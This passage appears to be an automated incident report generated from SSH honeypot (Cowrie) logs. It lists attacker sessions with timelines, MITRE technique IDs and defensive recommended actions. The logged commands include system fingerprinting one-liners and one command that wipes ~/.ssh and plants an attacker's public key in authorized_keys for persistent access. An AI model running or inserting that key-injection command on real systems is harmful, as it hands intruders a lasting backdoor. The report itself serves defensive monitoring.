- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a20795431c35

| Field | Detail |
|---|---|
| **Source IP** | `222.186.68[.]153` |
| **First Seen** | 2026-07-24 07:27 |
| **Last Seen** | 2026-07-24 07:27 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:27:36` | `cowrie.session.connect` |
| `2026-07-24 07:27:36` | `cowrie.client.version` |
| `2026-07-24 07:27:36` | `cowrie.client.kex` |
| `2026-07-24 07:27:38` | `cowrie.login.success` |
| `2026-07-24 07:27:40` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:27:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.186.68[.]153` to AbuseIPDB if not already reported
- [ ] Block `222.186.68[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2292261ed801

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:27 |
| **Last Seen** | 2026-07-24 07:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:27:38` | `cowrie.session.connect` |
| `2026-07-24 07:27:38` | `cowrie.client.version` |
| `2026-07-24 07:27:38` | `cowrie.client.kex` |
| `2026-07-24 07:27:40` | `cowrie.login.success` |
| `2026-07-24 07:27:42` | `cowrie.session.params` |
| `2026-07-24 07:27:42` | `cowrie.command.input` |
| `2026-07-24 07:27:42` | `cowrie.command.input` |
| `2026-07-24 07:27:42` | `cowrie.command.input` |
| `2026-07-24 07:27:42` | `cowrie.command.input` |
| `2026-07-24 07:27:42` | `cowrie.command.input` |
| `2026-07-24 07:27:42` | `cowrie.command.success` |
| `2026-07-24 07:27:42` | `cowrie.command.input` |
| `2026-07-24 07:27:42` | `cowrie.command.input` |
| `2026-07-24 07:27:42` | `cowrie.command.input` |
| `2026-07-24 07:27:42` | `cowrie.command.input` |
| `2026-07-24 07:27:42` | `cowrie.log.closed` |
| `2026-07-24 07:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-186cd5b84e9e

| Field | Detail |
|---|---|
| **Source IP** | `182.156.35[.]238` |
| **First Seen** | 2026-07-24 07:29 |
| **Last Seen** | 2026-07-24 07:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:29:14` | `cowrie.session.connect` |
| `2026-07-24 07:29:14` | `cowrie.client.version` |
| `2026-07-24 07:29:14` | `cowrie.client.kex` |
| `2026-07-24 07:29:17` | `cowrie.login.success` |
| `2026-07-24 07:29:17` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:29:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.35[.]238` to AbuseIPDB if not already reported
- [ ] Block `182.156.35[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66244670da6e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:29 |
| **Last Seen** | 2026-07-24 07:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:29:14` | `cowrie.session.connect` |
| `2026-07-24 07:29:14` | `cowrie.client.version` |
| `2026-07-24 07:29:14` | `cowrie.client.kex` |
| `2026-07-24 07:29:15` | `cowrie.login.success` |
| `2026-07-24 07:29:15` | `cowrie.session.params` |
| `2026-07-24 07:29:15` | `cowrie.command.input` |
| `2026-07-24 07:29:16` | `cowrie.log.closed` |
| `2026-07-24 07:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ba36b3a54bb

| Field | Detail |
|---|---|
| **Source IP** | `175.43.184[.]225` |
| **First Seen** | 2026-07-24 07:29 |
| **Last Seen** | 2026-07-24 07:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:29:27` | `cowrie.session.connect` |
| `2026-07-24 07:29:28` | `cowrie.client.version` |
| `2026-07-24 07:29:28` | `cowrie.client.kex` |
| `2026-07-24 07:29:31` | `cowrie.login.success` |
| `2026-07-24 07:29:31` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.43.184[.]225` to AbuseIPDB if not already reported
- [ ] Block `175.43.184[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cf5f60a9921

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:29 |
| **Last Seen** | 2026-07-24 07:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:29:33` | `cowrie.session.connect` |
| `2026-07-24 07:29:34` | `cowrie.client.version` |
| `2026-07-24 07:29:34` | `cowrie.client.kex` |
| `2026-07-24 07:29:36` | `cowrie.login.success` |
| `2026-07-24 07:29:38` | `cowrie.session.params` |
| `2026-07-24 07:29:38` | `cowrie.command.input` |
| `2026-07-24 07:29:38` | `cowrie.command.input` |
| `2026-07-24 07:29:38` | `cowrie.command.input` |
| `2026-07-24 07:29:38` | `cowrie.command.input` |
| `2026-07-24 07:29:38` | `cowrie.command.input` |
| `2026-07-24 07:29:38` | `cowrie.command.success` |
| `2026-07-24 07:29:38` | `cowrie.command.input` |
| `2026-07-24 07:29:38` | `cowrie.command.input` |
| `2026-07-24 07:29:38` | `cowrie.command.input` |
| `2026-07-24 07:29:38` | `cowrie.command.input` |
| `2026-07-24 07:29:38` | `cowrie.log.closed` |
| `2026-07-24 07:29:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89e61a71c9f6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:31 |
| **Last Seen** | 2026-07-24 07:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:31:08` | `cowrie.session.connect` |
| `2026-07-24 07:31:08` | `cowrie.client.version` |
| `2026-07-24 07:31:08` | `cowrie.client.kex` |
| `2026-07-24 07:31:08` | `cowrie.login.success` |
| `2026-07-24 07:31:09` | `cowrie.session.params` |
| `2026-07-24 07:31:09` | `cowrie.command.input` |
| `2026-07-24 07:31:09` | `cowrie.log.closed` |
| `2026-07-24 07:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d6e1c9c9d83

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:31 |
| **Last Seen** | 2026-07-24 07:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:31:30` | `cowrie.session.connect` |
| `2026-07-24 07:31:30` | `cowrie.client.version` |
| `2026-07-24 07:31:30` | `cowrie.client.kex` |
| `2026-07-24 07:31:32` | `cowrie.login.success` |
| `2026-07-24 07:31:34` | `cowrie.session.params` |
| `2026-07-24 07:31:34` | `cowrie.command.input` |
| `2026-07-24 07:31:34` | `cowrie.command.input` |
| `2026-07-24 07:31:34` | `cowrie.command.input` |
| `2026-07-24 07:31:34` | `cowrie.command.input` |
| `2026-07-24 07:31:34` | `cowrie.command.input` |
| `2026-07-24 07:31:34` | `cowrie.command.success` |
| `2026-07-24 07:31:34` | `cowrie.command.input` |
| `2026-07-24 07:31:34` | `cowrie.command.input` |
| `2026-07-24 07:31:34` | `cowrie.command.input` |
| `2026-07-24 07:31:34` | `cowrie.command.input` |
| `2026-07-24 07:31:35` | `cowrie.log.closed` |
| `2026-07-24 07:31:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6e72de70f87

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]196` |
| **First Seen** | 2026-07-24 07:31 |
| **Last Seen** | 2026-07-24 07:31 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:31:39` | `cowrie.session.connect` |
| `2026-07-24 07:31:39` | `cowrie.client.version` |
| `2026-07-24 07:31:40` | `cowrie.client.kex` |
| `2026-07-24 07:31:42` | `cowrie.login.success` |
| `2026-07-24 07:31:43` | `cowrie.session.params` |
| `2026-07-24 07:31:43` | `cowrie.command.input` |
| `2026-07-24 07:31:43` | `cowrie.command.failed` |
| `2026-07-24 07:31:43` | `cowrie.log.closed` |
| `2026-07-24 07:31:44` | `cowrie.session.params` |
| `2026-07-24 07:31:44` | `cowrie.command.input` |
| `2026-07-24 07:31:44` | `cowrie.session.file_download` |
| `2026-07-24 07:31:44` | `cowrie.log.closed` |
| `2026-07-24 07:31:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]196` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e8adc972796

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]196` |
| **First Seen** | 2026-07-24 07:31 |
| **Last Seen** | 2026-07-24 07:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:31:45` | `cowrie.session.connect` |
| `2026-07-24 07:31:45` | `cowrie.client.version` |
| `2026-07-24 07:31:45` | `cowrie.client.kex` |
| `2026-07-24 07:31:47` | `cowrie.login.success` |
| `2026-07-24 07:31:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]196` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae200e79ed52

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]196` |
| **First Seen** | 2026-07-24 07:31 |
| **Last Seen** | 2026-07-24 07:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:31:48` | `cowrie.session.connect` |
| `2026-07-24 07:31:48` | `cowrie.client.version` |
| `2026-07-24 07:31:49` | `cowrie.client.kex` |
| `2026-07-24 07:31:50` | `cowrie.login.success` |
| `2026-07-24 07:31:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]196` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cab30a838b20

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:33 |
| **Last Seen** | 2026-07-24 07:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:33:00` | `cowrie.session.connect` |
| `2026-07-24 07:33:00` | `cowrie.client.version` |
| `2026-07-24 07:33:00` | `cowrie.client.kex` |
| `2026-07-24 07:33:00` | `cowrie.login.success` |
| `2026-07-24 07:33:01` | `cowrie.session.params` |
| `2026-07-24 07:33:01` | `cowrie.command.input` |
| `2026-07-24 07:33:01` | `cowrie.log.closed` |
| `2026-07-24 07:33:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-906ee74bbb1f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:33 |
| **Last Seen** | 2026-07-24 07:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:33:26` | `cowrie.session.connect` |
| `2026-07-24 07:33:26` | `cowrie.client.version` |
| `2026-07-24 07:33:26` | `cowrie.client.kex` |
| `2026-07-24 07:33:29` | `cowrie.login.success` |
| `2026-07-24 07:33:31` | `cowrie.session.params` |
| `2026-07-24 07:33:31` | `cowrie.command.input` |
| `2026-07-24 07:33:31` | `cowrie.command.input` |
| `2026-07-24 07:33:31` | `cowrie.command.input` |
| `2026-07-24 07:33:31` | `cowrie.command.input` |
| `2026-07-24 07:33:31` | `cowrie.command.input` |
| `2026-07-24 07:33:31` | `cowrie.command.success` |
| `2026-07-24 07:33:31` | `cowrie.command.input` |
| `2026-07-24 07:33:31` | `cowrie.command.input` |
| `2026-07-24 07:33:31` | `cowrie.command.input` |
| `2026-07-24 07:33:31` | `cowrie.command.input` |
| `2026-07-24 07:33:31` | `cowrie.log.closed` |
| `2026-07-24 07:33:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f94fb748ca16

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:34 |
| **Last Seen** | 2026-07-24 07:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:34:46` | `cowrie.session.connect` |
| `2026-07-24 07:34:46` | `cowrie.client.version` |
| `2026-07-24 07:34:47` | `cowrie.client.kex` |
| `2026-07-24 07:34:47` | `cowrie.login.success` |
| `2026-07-24 07:34:47` | `cowrie.session.params` |
| `2026-07-24 07:34:47` | `cowrie.command.input` |
| `2026-07-24 07:34:48` | `cowrie.log.closed` |
| `2026-07-24 07:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-632c041086d5

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]218` |
| **First Seen** | 2026-07-24 07:35 |
| **Last Seen** | 2026-07-24 07:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:35:08` | `cowrie.session.connect` |
| `2026-07-24 07:35:08` | `cowrie.client.version` |
| `2026-07-24 07:35:08` | `cowrie.client.kex` |
| `2026-07-24 07:35:09` | `cowrie.login.success` |
| `2026-07-24 07:35:10` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:35:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]218` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bd238844aae

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:35 |
| **Last Seen** | 2026-07-24 07:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:35:26` | `cowrie.session.connect` |
| `2026-07-24 07:35:26` | `cowrie.client.version` |
| `2026-07-24 07:35:26` | `cowrie.client.kex` |
| `2026-07-24 07:35:29` | `cowrie.login.success` |
| `2026-07-24 07:35:30` | `cowrie.session.params` |
| `2026-07-24 07:35:30` | `cowrie.command.input` |
| `2026-07-24 07:35:30` | `cowrie.command.input` |
| `2026-07-24 07:35:30` | `cowrie.command.input` |
| `2026-07-24 07:35:30` | `cowrie.command.input` |
| `2026-07-24 07:35:30` | `cowrie.command.input` |
| `2026-07-24 07:35:30` | `cowrie.command.success` |
| `2026-07-24 07:35:30` | `cowrie.command.input` |
| `2026-07-24 07:35:30` | `cowrie.command.input` |
| `2026-07-24 07:35:30` | `cowrie.command.input` |
| `2026-07-24 07:35:30` | `cowrie.command.input` |
| `2026-07-24 07:35:31` | `cowrie.log.closed` |
| `2026-07-24 07:35:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bbc0ee09e38

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:36 |
| **Last Seen** | 2026-07-24 07:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:36:35` | `cowrie.session.connect` |
| `2026-07-24 07:36:35` | `cowrie.client.version` |
| `2026-07-24 07:36:35` | `cowrie.client.kex` |
| `2026-07-24 07:36:35` | `cowrie.login.success` |
| `2026-07-24 07:36:36` | `cowrie.session.params` |
| `2026-07-24 07:36:36` | `cowrie.command.input` |
| `2026-07-24 07:36:36` | `cowrie.log.closed` |
| `2026-07-24 07:36:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02ce9b2f727d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:37 |
| **Last Seen** | 2026-07-24 07:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:37:28` | `cowrie.session.connect` |
| `2026-07-24 07:37:29` | `cowrie.client.version` |
| `2026-07-24 07:37:29` | `cowrie.client.kex` |
| `2026-07-24 07:37:30` | `cowrie.login.success` |
| `2026-07-24 07:37:32` | `cowrie.session.params` |
| `2026-07-24 07:37:32` | `cowrie.command.input` |
| `2026-07-24 07:37:32` | `cowrie.command.input` |
| `2026-07-24 07:37:32` | `cowrie.command.input` |
| `2026-07-24 07:37:32` | `cowrie.command.input` |
| `2026-07-24 07:37:32` | `cowrie.command.input` |
| `2026-07-24 07:37:32` | `cowrie.command.success` |
| `2026-07-24 07:37:32` | `cowrie.command.input` |
| `2026-07-24 07:37:32` | `cowrie.command.input` |
| `2026-07-24 07:37:32` | `cowrie.command.input` |
| `2026-07-24 07:37:32` | `cowrie.command.input` |
| `2026-07-24 07:37:32` | `cowrie.log.closed` |
| `2026-07-24 07:37:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
